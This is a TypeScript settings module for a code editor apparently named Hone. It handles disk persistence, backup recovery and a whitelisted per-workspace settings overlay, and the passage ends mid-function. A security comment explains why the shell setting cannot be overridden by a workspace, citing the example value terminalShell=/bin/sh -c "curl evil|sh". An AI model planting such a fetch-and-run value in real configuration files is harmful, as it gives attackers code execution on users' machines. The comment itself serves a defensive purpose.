/**
 * Workbench runtime settings with disk persistence.
 *
 * Perry-native — no V8 runtime needed.
 * Settings persist to ~/.hone/settings.ini (simple key=value format).
 * Loaded on module init, saved on every update.
 */

import { readFileSync, writeFileSync, existsSync, mkdirSync } from 'fs';
import { getHomeDir, getAppDataDir } from './paths';
import { isWebPlatform } from '../platform';

// ---------------------------------------------------------------------------
// Types
// ---------------------------------------------------------------------------

export interface WorkbenchSettings {
  /** 'left' | 'right' — which side the Explorer sidebar appears */
  sidebarLocation: string;
  /** 'side' | 'top' | 'bottom' | 'hidden' — activity bar position */
  activityBarLocation: string;
  /** Whether the status bar is visible */
  statusBarVisible: boolean;
  /** Whether the sidebar is visible */
  sidebarVisible: boolean;
  /** Active sidebar panel index (0=files, 1=search, 2=git, 3=debug) */
  activePanelIndex: number;
  /** Whether the terminal panel is visible */
  terminalVisible: boolean;
  /** Color theme name */
  colorTheme: string;
  /** Editor font size */
  editorFontSize: number;
  /** Editor font family */
  editorFontFamily: string;
  /** Editor tab size */
  editorTabSize: number;
  /** Whether to show line numbers: 'on' | 'off' | 'relative' */
  editorLineNumbers: string;
  /** AI provider */
  aiProvider: string;
  /** AI model */
  aiModel: string;
  /** AI inline completion enabled */
  aiInlineCompletionEnabled: boolean;
  /** Editor: insert spaces instead of tabs */
  editorInsertSpaces: boolean;
  /** Editor: word wrap mode */
  editorWordWrap: string;
  /** Editor: minimap enabled */
  editorMinimapEnabled: boolean;
  /** Editor: format on save */
  editorFormatOnSave: boolean;
  /** Editor: cursor style */
  editorCursorStyle: string;
  /** Files: auto save mode */
  filesAutoSave: string;
  /** Files: auto save delay in ms */
  filesAutoSaveDelay: number;
  /** Files: trim trailing whitespace on save */
  filesTrimTrailingWhitespace: boolean;
  /** Editor: insert final newline on save */
  editorInsertFinalNewline: boolean;
  /** Editor: trim final blank lines on save */
  editorTrimFinalNewlines: boolean;
  /** Editor: normalize indentation on format */
  editorFormatNormalizeIndent: boolean;
  /** Terminal: font size */
  terminalFontSize: number;
  /** Terminal: cursor style */
  terminalCursorStyle: string;
  /** Terminal: shell command. Empty string = platform default (zsh / bash / powershell). #52. */
  terminalShell: string;
  /** Terminal: row count for the PTY grid. Larger fits more output before scroll. #54. */
  terminalRows: number;
  /** Terminal: column count for the PTY grid. Larger means longer lines before wrap. #54. */
  terminalCols: number;
  /** AI: inline completion delay in ms */
  aiInlineCompletionDelay: number;
  /** Search: use ignore files (.gitignore) */
  searchUseIgnoreFiles: boolean;
  /** Search: follow symlinks */
  searchFollowSymlinks: boolean;
  /** Last opened folder path */
  lastOpenFolder: string;
  /** AI API key (Anthropic) — legacy, migrated to aiKeyAnthropic */
  aiApiKey: string;
  /** AI: per-provider API keys */
  aiKeyAnthropic: string;
  aiKeyOpenai: string;
  aiKeyGoogle: string;
  aiKeyDeepseek: string;
  aiKeyXai: string;
  /** AI: Ollama settings */
  aiOllamaUrl: string;
  aiOllamaModel: string;
  /** AI: Custom endpoint settings */
  aiCustomUrl: string;
  aiCustomKey: string;
  aiCustomModel: string;
  /** Sync: enabled */
  syncEnabled: boolean;
  /** Sync: relay server URL */
  syncRelayUrl: string;
  /** Sync: auth server URL */
  syncAuthUrl: string;
  /** Sync: device token (set after login) */
  syncDeviceToken: string;
  /** Whether anonymous usage telemetry is enabled */
  telemetryEnabled: boolean;
  /** Whether the first-run setup has been completed */
  setupComplete: boolean;
  /** Sidebar width in points (default 220). SHIP-V1-GAPS.md #37. */
  sidebarWidth: number;
  /** Whether the explorer shows files starting with `.`. Default false. #95. */
  explorerShowHiddenFiles: boolean;
  /** Whether the explorer hides files matched by .gitignore. Default true. #50. */
  explorerRespectGitignore: boolean;
  /** Bitmask of which built-in extensions are enabled. Default all on. #57. */
  extensionsEnabledMask: number;
  /** Pipe-separated list of open tab file paths */
  lastOpenTabs: string;
  /** Pin mask matching lastOpenTabs — `1`/`0` chars per tab. #26. */
  lastPinnedTabs: string;
  /** Index of the active tab at last save */
  lastActiveTab: number;
  /** Cursor line of the active tab at last save (0-based). SHIP-V1-GAPS.md #43. */
  lastActiveCursorLine: number;
  /** Cursor column of the active tab at last save (0-based). */
  lastActiveCursorCol: number;
  /** Vertical scroll offset (in pixels) of the active tab at last save. */
  lastActiveScrollTop: number;
}

type SettingsChangeListener = (settings: WorkbenchSettings) => void;

// ---------------------------------------------------------------------------
// Persistence helpers
// ---------------------------------------------------------------------------

function getSettingsPath(): string {
  let p = getAppDataDir();
  p += '/settings.ini';
  return p;
}

function getSettingsDir(): string {
  return getAppDataDir();
}

// Last-known-good backup of settings.ini. The flush writes this BEFORE
// overwriting the live file, so a crash / forced-quit / disk-full during
// the non-atomic settings.ini write (Perry has no sync rename, so a true
// atomic temp+rename isn't possible in the 500ms sync flush) can't wipe
// every user setting — recovery on load falls back to this copy, losing at
// most the <=500ms of changes since the previous successful flush instead
// of the entire config.
function getSettingsBackupPath(): string {
  let p = getAppDataDir();
  p += '/settings.ini.bak';
  return p;
}

function ensureDir(dir: string): void {
  if (!existsSync(dir)) {
    try { mkdirSync(dir); } catch (e: any) { /* ignore */ }
  }
}


// ---------------------------------------------------------------------------
// Module-level state
// ---------------------------------------------------------------------------

// Initialize with hardcoded defaults (Perry-safe — no function call at init)
let _settings_sidebarLocation: string = 'left';
let _settings_activityBarLocation: string = 'side';
let _settings_statusBarVisible: number = 1;
let _settings_sidebarVisible: number = 1;
let _settings_activePanelIndex: number = 0;
let _settings_terminalVisible: number = 0;
let _settings_colorTheme: string = 'Hone Dark';
let _settings_editorFontSize: number = 13;
let _settings_editorFontFamily: string = 'Menlo';
let _settings_editorTabSize: number = 2;
let _settings_editorLineNumbers: string = 'on';
let _settings_aiProvider: string = 'anthropic';
let _settings_aiModel: string = 'claude-sonnet-4-6';
let _settings_aiInlineCompletionEnabled: number = 1;
let _settings_editorInsertSpaces: number = 1;
let _settings_editorWordWrap: string = 'off';
let _settings_editorMinimapEnabled: number = 1;
let _settings_editorFormatOnSave: number = 0;
let _settings_editorCursorStyle: string = 'line';
let _settings_filesAutoSave: string = 'off';
let _settings_filesAutoSaveDelay: number = 1000;
let _settings_filesTrimTrailingWhitespace: number = 0;
let _settings_editorInsertFinalNewline: number = 1;
let _settings_editorTrimFinalNewlines: number = 1;
let _settings_editorFormatNormalizeIndent: number = 0;
let _settings_terminalFontSize: number = 13;
let _settings_terminalCursorStyle: string = 'block';
let _settings_terminalShell: string = '';
let _settings_terminalRows: number = 30;
let _settings_terminalCols: number = 120;
let _settings_aiInlineCompletionDelay: number = 300;
let _settings_searchUseIgnoreFiles: number = 1;
let _settings_searchFollowSymlinks: number = 1;
let _settings_lastOpenFolder: string = '';
let _settings_aiApiKey: string = '';
let _settings_aiKeyAnthropic: string = '';
let _settings_aiKeyOpenai: string = '';
let _settings_aiKeyGoogle: string = '';
let _settings_aiKeyDeepseek: string = '';
let _settings_aiKeyXai: string = '';
let _settings_aiOllamaUrl: string = 'http://localhost:11434';
let _settings_aiOllamaModel: string = 'llama3:8b';
let _settings_aiCustomUrl: string = '';
let _settings_aiCustomKey: string = '';
let _settings_aiCustomModel: string = '';
let _settings_syncEnabled: number = 0;
let _settings_syncRelayUrl: string = 'wss://sync.hone.codes/ws';
let _settings_syncAuthUrl: string = 'https://auth.hone.codes';
let _settings_syncDeviceToken: string = '';
let _settings_telemetryEnabled: number = 0;
let _settings_setupComplete: number = 0;
let _settings_lastOpenTabs: string = '';
let _settings_lastPinnedTabs: string = '';
let _settings_lastActiveTab: number = 0;
let _settings_lastActiveCursorLine: number = 0;
let _settings_lastActiveCursorCol: number = 0;
let _settings_lastActiveScrollTop: number = 0;
let _settings_sidebarWidth: number = 220;
let _settings_explorerShowHiddenFiles: number = 0;
let _settings_explorerRespectGitignore: number = 1;
let _settings_extensionsEnabledMask: number = 2047; // all 11 builtin extensions on by default
let _settingsLoaded: number = 0;
let _settingsVersion: number = 0;

const _listeners: SettingsChangeListener[] = [];

// ---------------------------------------------------------------------------
// API
// ---------------------------------------------------------------------------

/** Load settings from disk. Call once after module system is ready. */
export function initSettings(): void {
  if (_settingsLoaded > 0) return;
  _settingsLoaded = 1;

  // Web defaults: dark mode, sync disabled, telemetry OFF (opt-in everywhere), setup done.
  // The setup screen never runs on web, so users opt in via Settings → Privacy after install.
  if (isWebPlatform() > 0) {
    _settings_colorTheme = 'Hone Dark';
    _settings_syncEnabled = 0;
    _settings_telemetryEnabled = 0;
    _settings_setupComplete = 1;
    return;
  }

  const path = getSettingsPath();
  let text = '';
  try {
    if (existsSync(path)) {
      text = readFileSync(path);
    }
  } catch (e: any) {
    text = '';
  }
  // Recovery: if settings.ini is missing/empty/truncated (a crash during
  // the non-atomic flush write), fall back to the .bak written before the
  // last overwrite. Bounds worst-case loss to <=500ms of changes instead
  // of the entire user config.
  if (text.length < 3) {
    try {
      const bp = getSettingsBackupPath();
      if (existsSync(bp)) {
        const btext = readFileSync(bp);
        if (btext.length >= 3) text = btext;
      }
    } catch (_re: any) { /* no usable backup — fall through to defaults */ }
  }
  if (text.length < 3) return;

  const lines = text.split('\n');
  for (let i = 0; i < lines.length; i++) {
    const line = lines[i];
    if (line.length < 3) continue;
    let eqIdx = -1;
    for (let j = 0; j < line.length; j++) {
      if (line.charCodeAt(j) === 61) { eqIdx = j; break; }
    }
    if (eqIdx < 1) continue;
    const key = line.slice(0, eqIdx);
    const val = line.slice(eqIdx + 1);
    if (key === 'sidebarLocation') _settings_sidebarLocation = val;
    if (key === 'activityBarLocation') _settings_activityBarLocation = val;
    if (key === 'statusBarVisible') _settings_statusBarVisible = val === '1' ? 1 : 0;
    if (key === 'sidebarVisible') _settings_sidebarVisible = val === '1' ? 1 : 0;
    if (key === 'activePanelIndex') { const n = parseInt(val); if (n >= 0) _settings_activePanelIndex = n; }
    if (key === 'terminalVisible') _settings_terminalVisible = val === '1' ? 1 : 0;
    if (key === 'colorTheme') _settings_colorTheme = val;
    if (key === 'editorFontSize') { const n = parseInt(val); if (n > 0) _settings_editorFontSize = n; }
    if (key === 'editorFontFamily') _settings_editorFontFamily = val;
    if (key === 'editorTabSize') { const n = parseInt(val); if (n > 0) _settings_editorTabSize = n; }
    if (key === 'editorLineNumbers') _settings_editorLineNumbers = val;
    if (key === 'aiProvider') _settings_aiProvider = val;
    if (key === 'aiModel') _settings_aiModel = val;
    if (key === 'aiInlineCompletionEnabled') _settings_aiInlineCompletionEnabled = val === '1' ? 1 : 0;
    if (key === 'editorInsertSpaces') _settings_editorInsertSpaces = val === '1' ? 1 : 0;
    if (key === 'editorWordWrap') _settings_editorWordWrap = val;
    if (key === 'editorMinimapEnabled') _settings_editorMinimapEnabled = val === '1' ? 1 : 0;
    if (key === 'editorFormatOnSave') _settings_editorFormatOnSave = val === '1' ? 1 : 0;
    if (key === 'editorCursorStyle') _settings_editorCursorStyle = val;
    if (key === 'filesAutoSave') _settings_filesAutoSave = val;
    if (key === 'filesAutoSaveDelay') { const n = parseInt(val); if (n >= 0) _settings_filesAutoSaveDelay = n; }
    if (key === 'filesTrimTrailingWhitespace') _settings_filesTrimTrailingWhitespace = val === '1' ? 1 : 0;
    if (key === 'editorInsertFinalNewline') _settings_editorInsertFinalNewline = val === '1' ? 1 : 0;
    if (key === 'editorTrimFinalNewlines') _settings_editorTrimFinalNewlines = val === '1' ? 1 : 0;
    if (key === 'editorFormatNormalizeIndent') _settings_editorFormatNormalizeIndent = val === '1' ? 1 : 0;
    if (key === 'terminalFontSize') { const n = parseInt(val); if (n > 0) _settings_terminalFontSize = n; }
    if (key === 'terminalCursorStyle') _settings_terminalCursorStyle = val;
    if (key === 'terminalShell') _settings_terminalShell = val;
    if (key === 'terminalRows') { const n = parseInt(val); if (n >= 4 && n <= 200) _settings_terminalRows = n; }
    if (key === 'terminalCols') { const n = parseInt(val); if (n >= 40 && n <= 500) _settings_terminalCols = n; }
    if (key === 'aiInlineCompletionDelay') { const n = parseInt(val); if (n >= 0) _settings_aiInlineCompletionDelay = n; }
    if (key === 'searchUseIgnoreFiles') _settings_searchUseIgnoreFiles = val === '1' ? 1 : 0;
    if (key === 'searchFollowSymlinks') _settings_searchFollowSymlinks = val === '1' ? 1 : 0;
    if (key === 'lastOpenFolder') _settings_lastOpenFolder = val;
    if (key === 'aiApiKey') _settings_aiApiKey = val;
    if (key === 'aiKeyAnthropic') _settings_aiKeyAnthropic = val;
    if (key === 'aiKeyOpenai') _settings_aiKeyOpenai = val;
    if (key === 'aiKeyGoogle') _settings_aiKeyGoogle = val;
    if (key === 'aiKeyDeepseek') _settings_aiKeyDeepseek = val;
    if (key === 'aiKeyXai') _settings_aiKeyXai = val;
    if (key === 'aiOllamaUrl') _settings_aiOllamaUrl = val;
    if (key === 'aiOllamaModel') _settings_aiOllamaModel = val;
    if (key === 'aiCustomUrl') _settings_aiCustomUrl = val;
    if (key === 'aiCustomKey') _settings_aiCustomKey = val;
    if (key === 'aiCustomModel') _settings_aiCustomModel = val;
    if (key === 'syncEnabled') _settings_syncEnabled = val === '1' ? 1 : 0;
    if (key === 'syncRelayUrl') _settings_syncRelayUrl = val;
    if (key === 'syncAuthUrl') _settings_syncAuthUrl = val;
    if (key === 'syncDeviceToken') _settings_syncDeviceToken = val;
    if (key === 'telemetryEnabled') _settings_telemetryEnabled = val === '1' ? 1 : 0;
    if (key === 'setupComplete') _settings_setupComplete = val === '1' ? 1 : 0;
    if (key === 'lastOpenTabs') _settings_lastOpenTabs = val;
    if (key === 'lastPinnedTabs') _settings_lastPinnedTabs = val;
    if (key === 'lastActiveTab') { const n = parseInt(val); if (n >= 0) _settings_lastActiveTab = n; }
    if (key === 'lastActiveCursorLine') { const n = parseInt(val); if (n >= 0) _settings_lastActiveCursorLine = n; }
    if (key === 'lastActiveCursorCol') { const n = parseInt(val); if (n >= 0) _settings_lastActiveCursorCol = n; }
    if (key === 'lastActiveScrollTop') { const n = parseInt(val); if (n >= 0) _settings_lastActiveScrollTop = n; }
    if (key === 'sidebarWidth') { const n = parseInt(val); if (n >= 120 && n <= 800) _settings_sidebarWidth = n; }
    if (key === 'explorerShowHiddenFiles') _settings_explorerShowHiddenFiles = val === '1' ? 1 : 0;
    if (key === 'explorerRespectGitignore') _settings_explorerRespectGitignore = val === '0' ? 0 : 1;
    if (key === 'extensionsEnabledMask') { const n = parseInt(val); if (n >= 0 && n <= 2047) _settings_extensionsEnabledMask = n; }
  }

  // Migrate legacy aiApiKey → aiKeyAnthropic
  if (_settings_aiKeyAnthropic.length < 5 && _settings_aiApiKey.length > 5) {
    _settings_aiKeyAnthropic = _settings_aiApiKey;
  }
}

/** Build a settings snapshot from module-level vars. */
function buildSnapshot(): WorkbenchSettings {
  return {
    sidebarLocation: _settings_sidebarLocation,
    activityBarLocation: _settings_activityBarLocation,
    statusBarVisible: _settings_statusBarVisible > 0,
    sidebarVisible: _settings_sidebarVisible > 0,
    activePanelIndex: _settings_activePanelIndex,
    terminalVisible: _settings_terminalVisible > 0,
    colorTheme: _settings_colorTheme,
    editorFontSize: _settings_editorFontSize,
    editorFontFamily: _settings_editorFontFamily,
    editorTabSize: _settings_editorTabSize,
    editorLineNumbers: _settings_editorLineNumbers,
    aiProvider: _settings_aiProvider,
    aiModel: _settings_aiModel,
    aiInlineCompletionEnabled: _settings_aiInlineCompletionEnabled > 0,
    editorInsertSpaces: _settings_editorInsertSpaces > 0,
    editorWordWrap: _settings_editorWordWrap,
    editorMinimapEnabled: _settings_editorMinimapEnabled > 0,
    editorFormatOnSave: _settings_editorFormatOnSave > 0,
    editorCursorStyle: _settings_editorCursorStyle,
    filesAutoSave: _settings_filesAutoSave,
    filesAutoSaveDelay: _settings_filesAutoSaveDelay,
    filesTrimTrailingWhitespace: _settings_filesTrimTrailingWhitespace > 0,
    editorInsertFinalNewline: _settings_editorInsertFinalNewline > 0,
    editorTrimFinalNewlines: _settings_editorTrimFinalNewlines > 0,
    editorFormatNormalizeIndent: _settings_editorFormatNormalizeIndent > 0,
    terminalFontSize: _settings_terminalFontSize,
    terminalCursorStyle: _settings_terminalCursorStyle,
    terminalShell: _settings_terminalShell,
    terminalRows: _settings_terminalRows,
    terminalCols: _settings_terminalCols,
    aiInlineCompletionDelay: _settings_aiInlineCompletionDelay,
    searchUseIgnoreFiles: _settings_searchUseIgnoreFiles > 0,
    searchFollowSymlinks: _settings_searchFollowSymlinks > 0,
    lastOpenFolder: _settings_lastOpenFolder,
    aiApiKey: _settings_aiApiKey,
    aiKeyAnthropic: _settings_aiKeyAnthropic,
    aiKeyOpenai: _settings_aiKeyOpenai,
    aiKeyGoogle: _settings_aiKeyGoogle,
    aiKeyDeepseek: _settings_aiKeyDeepseek,
    aiKeyXai: _settings_aiKeyXai,
    aiOllamaUrl: _settings_aiOllamaUrl,
    aiOllamaModel: _settings_aiOllamaModel,
    aiCustomUrl: _settings_aiCustomUrl,
    aiCustomKey: _settings_aiCustomKey,
    aiCustomModel: _settings_aiCustomModel,
    syncEnabled: _settings_syncEnabled > 0,
    syncRelayUrl: _settings_syncRelayUrl,
    syncAuthUrl: _settings_syncAuthUrl,
    syncDeviceToken: _settings_syncDeviceToken,
    telemetryEnabled: _settings_telemetryEnabled > 0,
    setupComplete: _settings_setupComplete > 0,
    lastOpenTabs: _settings_lastOpenTabs,
    lastPinnedTabs: _settings_lastPinnedTabs,
    lastActiveTab: _settings_lastActiveTab,
    lastActiveCursorLine: _settings_lastActiveCursorLine,
    lastActiveCursorCol: _settings_lastActiveCursorCol,
    lastActiveScrollTop: _settings_lastActiveScrollTop,
    sidebarWidth: _settings_sidebarWidth,
    explorerShowHiddenFiles: _settings_explorerShowHiddenFiles > 0,
    explorerRespectGitignore: _settings_explorerRespectGitignore > 0,
    extensionsEnabledMask: _settings_extensionsEnabledMask,
  };
}

/** Get current workbench settings. */
export function getWorkbenchSettings(): WorkbenchSettings {
  return buildSnapshot();
}

/** Convert small non-negative integer to string (Perry-safe, no .toString()). */
function intToStr(n: number): string {
  if (n < 0) return '0';
  if (n < 10) {
    if (n === 0) return '0';
    if (n === 1) return '1';
    if (n === 2) return '2';
    if (n === 3) return '3';
    if (n === 4) return '4';
    if (n === 5) return '5';
    if (n === 6) return '6';
    if (n === 7) return '7';
    if (n === 8) return '8';
    if (n === 9) return '9';
  }
  // Two digits (10-99)
  const tens = (n / 10) | 0;
  const ones = n - (tens * 10);
  let s = '';
  s += intToStr(tens);
  s += intToStr(ones);
  return s;
}

function serializeFromVars(): string {
  let out = '';
  out += 'sidebarLocation=';
  out += _settings_sidebarLocation;
  out += '\n';
  out += 'activityBarLocation=';
  out += _settings_activityBarLocation;
  out += '\n';
  out += 'statusBarVisible=';
  out += _settings_statusBarVisible > 0 ? '1' : '0';
  out += '\n';
  out += 'sidebarVisible=';
  out += _settings_sidebarVisible > 0 ? '1' : '0';
  out += '\n';
  out += 'activePanelIndex=';
  out += intToStr(_settings_activePanelIndex);
  out += '\n';
  out += 'terminalVisible=';
  out += _settings_terminalVisible > 0 ? '1' : '0';
  out += '\n';
  out += 'colorTheme=';
  out += _settings_colorTheme;
  out += '\n';
  out += 'editorFontSize=';
  out += intToStr(_settings_editorFontSize);
  out += '\n';
  out += 'editorFontFamily=';
  out += _settings_editorFontFamily;
  out += '\n';
  out += 'editorTabSize=';
  out += intToStr(_settings_editorTabSize);
  out += '\n';
  out += 'editorLineNumbers=';
  out += _settings_editorLineNumbers;
  out += '\n';
  out += 'aiProvider=';
  out += _settings_aiProvider;
  out += '\n';
  out += 'aiModel=';
  out += _settings_aiModel;
  out += '\n';
  out += 'aiInlineCompletionEnabled=';
  out += _settings_aiInlineCompletionEnabled > 0 ? '1' : '0';
  out += '\n';
  out += 'editorInsertSpaces=';
  out += _settings_editorInsertSpaces > 0 ? '1' : '0';
  out += '\n';
  out += 'editorWordWrap=';
  out += _settings_editorWordWrap;
  out += '\n';
  out += 'editorMinimapEnabled=';
  out += _settings_editorMinimapEnabled > 0 ? '1' : '0';
  out += '\n';
  out += 'editorFormatOnSave=';
  out += _settings_editorFormatOnSave > 0 ? '1' : '0';
  out += '\n';
  out += 'editorCursorStyle=';
  out += _settings_editorCursorStyle;
  out += '\n';
  out += 'filesAutoSave=';
  out += _settings_filesAutoSave;
  out += '\n';
  out += 'filesAutoSaveDelay=';
  out += intToStr(_settings_filesAutoSaveDelay);
  out += '\n';
  out += 'filesTrimTrailingWhitespace=';
  out += _settings_filesTrimTrailingWhitespace > 0 ? '1' : '0';
  out += '\n';
  out += 'editorInsertFinalNewline=';
  out += _settings_editorInsertFinalNewline > 0 ? '1' : '0';
  out += '\n';
  out += 'editorTrimFinalNewlines=';
  out += _settings_editorTrimFinalNewlines > 0 ? '1' : '0';
  out += '\n';
  out += 'editorFormatNormalizeIndent=';
  out += _settings_editorFormatNormalizeIndent > 0 ? '1' : '0';
  out += '\n';
  out += 'terminalFontSize=';
  out += intToStr(_settings_terminalFontSize);
  out += '\n';
  out += 'terminalCursorStyle=';
  out += _settings_terminalCursorStyle;
  out += '\n';
  out += 'terminalShell=';
  out += _settings_terminalShell;
  out += '\n';
  out += 'terminalRows=';
  out += intToStr(_settings_terminalRows);
  out += '\n';
  out += 'terminalCols=';
  out += intToStr(_settings_terminalCols);
  out += '\n';
  out += 'aiInlineCompletionDelay=';
  out += intToStr(_settings_aiInlineCompletionDelay);
  out += '\n';
  out += 'searchUseIgnoreFiles=';
  out += _settings_searchUseIgnoreFiles > 0 ? '1' : '0';
  out += '\n';
  out += 'searchFollowSymlinks=';
  out += _settings_searchFollowSymlinks > 0 ? '1' : '0';
  out += '\n';
  out += 'lastOpenFolder=';
  out += _settings_lastOpenFolder;
  out += '\n';
  out += 'aiApiKey=';
  out += _settings_aiApiKey;
  out += '\n';
  out += 'aiKeyAnthropic=';
  out += _settings_aiKeyAnthropic;
  out += '\n';
  out += 'aiKeyOpenai=';
  out += _settings_aiKeyOpenai;
  out += '\n';
  out += 'aiKeyGoogle=';
  out += _settings_aiKeyGoogle;
  out += '\n';
  out += 'aiKeyDeepseek=';
  out += _settings_aiKeyDeepseek;
  out += '\n';
  out += 'aiKeyXai=';
  out += _settings_aiKeyXai;
  out += '\n';
  out += 'aiOllamaUrl=';
  out += _settings_aiOllamaUrl;
  out += '\n';
  out += 'aiOllamaModel=';
  out += _settings_aiOllamaModel;
  out += '\n';
  out += 'aiCustomUrl=';
  out += _settings_aiCustomUrl;
  out += '\n';
  out += 'aiCustomKey=';
  out += _settings_aiCustomKey;
  out += '\n';
  out += 'aiCustomModel=';
  out += _settings_aiCustomModel;
  out += '\n';
  out += 'syncEnabled=';
  out += _settings_syncEnabled > 0 ? '1' : '0';
  out += '\n';
  out += 'syncRelayUrl=';
  out += _settings_syncRelayUrl;
  out += '\n';
  out += 'syncAuthUrl=';
  out += _settings_syncAuthUrl;
  out += '\n';
  out += 'syncDeviceToken=';
  out += _settings_syncDeviceToken;
  out += '\n';
  out += 'telemetryEnabled=';
  out += _settings_telemetryEnabled > 0 ? '1' : '0';
  out += '\n';
  out += 'setupComplete=';
  out += _settings_setupComplete > 0 ? '1' : '0';
  out += '\n';
  out += 'lastOpenTabs=';
  out += _settings_lastOpenTabs;
  out += '\n';
  out += 'lastPinnedTabs=';
  out += _settings_lastPinnedTabs;
  out += '\n';
  out += 'lastActiveTab=';
  out += intToStr(_settings_lastActiveTab);
  out += '\n';
  out += 'lastActiveCursorLine=';
  out += intToStr(_settings_lastActiveCursorLine);
  out += '\n';
  out += 'lastActiveCursorCol=';
  out += intToStr(_settings_lastActiveCursorCol);
  out += '\n';
  out += 'lastActiveScrollTop=';
  out += intToStr(_settings_lastActiveScrollTop);
  out += '\n';
  out += 'sidebarWidth=';
  out += intToStr(_settings_sidebarWidth);
  out += '\n';
  out += 'explorerShowHiddenFiles=';
  out += _settings_explorerShowHiddenFiles > 0 ? '1' : '0';
  out += '\n';
  out += 'explorerRespectGitignore=';
  out += _settings_explorerRespectGitignore > 0 ? '1' : '0';
  out += '\n';
  out += 'extensionsEnabledMask=';
  out += intToStr(_settings_extensionsEnabledMask);
  out += '\n';
  return out;
}

// Debounced disk persistence — batches rapid successive writes
let _settingsDirty = 0;

function persistToDisk(): void {
  _settingsDirty = 1;
}

function _flushSettingsToDisk(): void {
  if (_settingsDirty < 1) return;
  try {
    ensureDir(getSettingsDir());
    const sp = getSettingsPath();
    // Step A: snapshot the current good settings.ini → .bak BEFORE we
    // overwrite it. A crash here leaves settings.ini untouched (no
    // recovery needed). A crash during step B leaves this .bak (the
    // previous good state) intact for load-time recovery.
    try {
      if (existsSync(sp)) {
        const prev = readFileSync(sp);
        if (prev.length >= 3) writeFileSync(getSettingsBackupPath(), prev);
      }
    } catch (_be: any) { /* backup best-effort; never block the real write */ }
    // Step B: write the live file.
    writeFileSync(sp, serializeFromVars());
    // Only now is the change durably persisted — clear the dirty flag
    // AFTER success so a failed write (disk full / permission) is retried
    // on the next tick instead of being silently dropped.
    _settingsDirty = 0;
  } catch (e: any) { /* keep _settingsDirty=1 → retry next 500ms tick */ }
}

// Self-contained flush timer — fires every 500ms, writes only if dirty
setInterval(() => { _flushSettingsToDisk(); }, 500);

// ---------------------------------------------------------------------------
// Workspace overlay (SHIP-V1-GAPS.md #42)
//
// `${workspaceRoot}/.hone/settings.ini` overrides a curated subset of user
// settings for the duration of the session. Overlay reads are non-persisting
// — closing the workspace and reopening with a different one drops the
// previous overlay. Global / sensitive keys (AI API keys, sync tokens,
// telemetry choice) are intentionally NOT overridable from a workspace file:
// a project shouldn't be able to repoint your AI provider or flip your
// privacy toggle behind your back.
// ---------------------------------------------------------------------------

/** Workspace-overrideable settings — project-shaped, never security-sensitive. */
const WORKSPACE_OVERRIDABLE: Record<string, number> = {
  'colorTheme': 1,
  'editorFontFamily': 1,
  'editorFontSize': 1,
  'editorTabSize': 1,
  'editorInsertSpaces': 1,
  'editorLineNumbers': 1,
  'editorWordWrap': 1,
  'editorMinimapEnabled': 1,
  'editorFormatOnSave': 1,
  'editorCursorStyle': 1,
  'filesAutoSave': 1,
  'filesAutoSaveDelay': 1,
  // SECURITY: `terminalShell` is deliberately NOT workspace-overridable.
  // The overlay applies keys from a cloned repo's `.hone/settings.ini`
  // automatically. If `terminalShell` were overridable a hostile repo could
  // ship `.hone/settings.ini` with `terminalShell=/bin/sh -c "curl evil|sh"`
  // and get arbitrary code execution the moment the victim opens the
  // integrated terminal — no further interaction. This is the exact
  // malicious-workspace-settings class VS Code gates behind Workspace Trust.
  // It is a strictly worse hazard than the AI-key/sync-token globals that
  // were already (correctly) excluded. Until #58 workspace-trust actually
  // gates plugin/exec surfaces, the shell command must stay user-global-only.
  'terminalRows': 1,
  'terminalCols': 1,
  'filesTrimTrailingWhitespace': 1,
  'editorInsertFinalNewline': 1,
  'editorTrimFinalNewlines': 1,
  'editorFormatNormalizeIndent': 1,
  'aiInlineCompletionEnabled': 1,
  'aiInlineCompletionDelay': 1,
  'searchUseIgnoreFiles': 1,
  'searchFollowSymlinks': 1,
  'terminalFontSize': 1,
  'terminalCursorStyle': 1,
};

let _workspaceOverlayActive: number = 0;
let _workspaceOverlayRoot: string = '';

/**
 * Apply workspace settings overlay from `${root}/.hone/settings.ini`.
 * Returns the number of keys that were applied (0 if no file or no matches).
 * Subsequent calls with a different root drop the previous overlay.
 *
 * Currently the overlay is one-shot at workspace-open time; we don't watch
 * the file for changes. Hot-reload is a follow-up.
 */
export function applyWorkspaceOverlay(root: string): number {
  if (root.length === 0) return 0;
  const path = root + '/.hone/settings.ini';
  if (!existsSync(path)) {
    _workspaceOverlayActive = 0;
    _workspaceOverlayRoot = '';
    return 0;
  }
  let text = '';
  try {
    text = readFileSync(path);
  } catch (_e: any) {
    return 0;
  }
  if (text.length < 3) return 0;

  let applied = 0;
  const lines = text.split('\n');
  for (let i = 0; i < lines.length; i++) {
    const line = lines[i];
    if (line.length < 3) continue;
    if (line.charCodeAt(0) === 35) continue; // '#' comment
    let eqIdx = -1;
    for (let j = 0; j < line.length; j++) {
      if (line.charCodeAt(j) === 61) { eqIdx = j; break; }
    }
    if (eqIdx < 1) continue;
    const key = line.slice(0, eqIdx);
    const val = line.slice(eqIdx + 1);
    if (WORKSPACE_OVERRIDABLE[key] !== 1) continue;
    if (applyOverlayKey(key, val) > 0) applied++;
  }

  if (applied > 0) {
    _workspaceOverlayActive = 1;
    _workspaceOverlayRoot = root;
    _settingsVersion = _settingsVersion + 1;
    for (let i = 0; i < _listeners.length; i++) {
      _listeners[i](buildSnapshot());
    }
  }
  return applied;
}

function applyOverlayKey(key: string, val: string): number {
  if (key === 'colorTheme') { _settings_colorTheme = val; return 1; }
  if (key === 'editorFontFamily') { _settings_editorFontFamily = val; return 1; }
  if (key === 'editorFontSize') { const n = parseInt(val); if (n > 0) { _settings_editorFontSize = n; return 1; } return 0; }
  if (key === 'editorTabSize') { const n = parseInt(val); if (n > 0) { _settings_editorTabSize = n; return 1; } return 0; }
  if (key === 'editorInsertSpaces') { _settings_editorInsertSpaces = val === '1' ? 1 : 0; return 1; }
  if (key === 'editorLineNumbers') { _settings_editorLineNumbers = val; return 1; }
  if (key === 'editorWordWrap') { _settings_editorWordWrap = val; return 1; }
  if (key === 'editorMinimapEnabled') { _settings_editorMinimapEnabled = val === '1' ? 1 : 0; return 1; }
  if (key === 'editorFormatOnSave') { _settings_editorFormatOnSave = val === '1' ? 1 : 0; return 1; }
  if (key === 'editorCursorStyle') { _settings_editorCursorStyle = val; return 1; }
  if (key === 'filesAutoSave') { _settings_filesAutoSave = val; return 1; }
  if (key === 'filesAutoSaveDelay') { const n = parseInt(val); if (n >= 0) { _settings_filesAutoSaveDelay = n; return 1; } return 0; }
